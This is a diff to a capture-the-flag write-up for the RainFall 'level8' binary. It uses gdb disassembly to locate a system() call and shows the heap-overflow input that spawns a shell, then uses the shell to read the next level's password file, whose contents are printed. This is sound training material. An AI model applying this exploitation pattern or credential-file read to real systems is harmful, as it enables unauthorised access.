@@ -1,4 +1,4 @@
-Using gdb we can see that 2 words are hardcoded
+Using gdb we can see that 2 global variable 'auth' and 'service' are declared.
     (gdb) disass main
     ...
     0x08048575 <+17>:    mov    0x8049ab0,%ecx
@@ -9,4 +9,45 @@ Using gdb we can see that 2 words are hardcoded
     (gdb) x/x 0x8049ab0
     0x8049ab0 <service>:    0x00000000
 
-auth will be stored in edx and service will be stored in ecx.
+There is also a command login
+    0x080486bb <+343>:   mov    $0x804882d,%eax
+    (gdb) x/x 0x804882d
+    0x804882d:      0x69676f6c
+    (gdb) x/x 0x804882d+4
+    0x8048831:      0x622f006e
+and reset
+    0x08048648 <+228>:   mov    $0x804881f,%eax
+    (gdb) x/x 0x804881f
+    0x804881f:      0x65736572
+    (gdb) x/x 0x804881f+4
+    0x8048823:      0x65730074
+
+We can see that there is a call to system if auth[32] is not 0
+   0x080486e2 <+382>:   mov    0x8049aac,%eax      -> auth in eax
+   0x080486e7 <+387>:   mov    0x20(%eax),%eax     -> auth+32 in eax
+   0x080486ea <+390>:   test   %eax,%eax           -> check if eax is 0
+   0x080486ec <+392>:   je     0x80486ff <main+411>
+   0x080486ee <+394>:   movl   $0x8048833,(%esp)
+   0x080486f5 <+401>:   call   0x8048480 <system@plt>
+
+We will try to modify the value of 'auth' to have auth[32] != 0
+   level8@RainFall:~$ ./level8
+   (nil), (nil) 
+   auth
+   (nil), (nil) 
+   auth 
+   0x804a008, (nil) 
+   service
+   0x804a008, 0x804a018    -> service address is 16bytes after the address of auth
+
+So if we pass 16bytes with service, we can reach auth+32, therefor we just need to pass
+a string 'serviceaaaaaaaaaaaaaaaa' and then we can use login
+   level8@RainFall:~$ ./level8 
+   (nil), (nil) 
+   auth 
+   0x804a008, (nil) 
+   serviceaaaaaaaaaaaaaaaa
+   0x804a008, 0x804a018 
+   login
+   $ cat /home/user/level9/.pass
+   c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
